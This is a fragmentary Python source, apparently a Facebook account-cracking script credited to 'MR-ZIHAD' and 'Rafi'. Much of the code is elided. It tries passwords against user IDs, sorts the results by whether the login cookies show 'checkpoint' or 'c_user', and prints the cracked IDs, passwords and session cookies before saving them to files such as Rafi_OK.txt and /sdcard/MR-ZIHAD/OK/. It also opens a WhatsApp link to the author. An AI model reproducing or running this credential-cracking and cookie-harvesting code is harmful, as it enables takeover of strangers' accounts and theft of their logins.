...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;97mMR-ZIHAD]')
...
def notice():
	...
	print('\x1b[0;92mADMIN WHATSAPP\x1aMR_ZIHAD')
	time.sleep(2)
	os.system('am start https://wa.me/+8801842827520')
	...
	for pw in pwv:
		try:
			...
			if 'checkpoint' in po.cookies.get_dict().keys():
				...
				print('')
				print('\x1b[1;92m══════════════════════════════════════════')
				print('\x1b[1;91m[✓] STATUS		: \x1b[1;96mRafi_CP🥀')
				print(f"\x1b[1;91m[✓] USER ID	   : {idf}\n\x1b[1;91m[✓] USER PASSWORD : {pw}")
				print('\x1b[1;92m══════════════════════════════════════════')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] USER AGENT: ')
				...
				print('')
				open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
				open('Rafi_CP.txt', 'a').write(idf + '|' + pw + '\n')
				akun.append(idf + '|' + pw)
				cp += 1
			elif 'c_user' in ses.cookies.get_dict().keys():
				ok += 1
				...
				print('')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] STATUS		: \x1b[1;96mRafi_OK💚')
				print(f"\x1b[1;92m[✓] USER ID	   : {idf}\n\x1b[1;92m[✓] USER PASSWORD : {pw}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] USER COOKIES: ')
				print(f"\r{kuki}{N}")
				...
				print('\x1b[1;91m══════════════════════════════════════════')
				print('')
				open('Rafi_OK.txt', 'a').write(idf + '|' + pw + kuki + '\n')
		...
		try:
			...
			if 'checkpoint' in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					coki = po.cookies.get_dict()
					kuki = ';'.join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
					open('/sdcard/MR-ZIHAD/OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
					print('\n')
					statusok = f'''[•] ID	   : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'''
					statusok1 = nel(statusok, 'green', **('style',))
					cetak(nel(statusok1, 'MR-ZIHAD  OK', **('title',)))
					ok += 1
					...
					statusok1 = nel(statusok, 'green', **('style',))
					cetak(nel(statusok1, '[bold green]Rafi_OK[/bold green]', **('title',)))
					ok += 1
				else:
					continue
			else:
		...
		try:
			...
			if 'checkpoint' in po.cookies.get_dict().keys() or 'ya' in oprek:
				...
				if 'ya' in princp:
					...
					statuscp = f'''[•] ID	   : {idf} [•] PASSWORD : {pw}'''
					statuscp1 = nel(statuscp, 'red', **('style',))
					cetak(nel(statuscp1, 'Rafi_CP', **('title',)))
					open('Rafi_CP.txt', 'a').write(idf + '|' + pw + '\n')
					akun.append(idf + '|' + pw)
					cp += 1
			elif 'c_user' in ses.cookies.get_dict().keys():
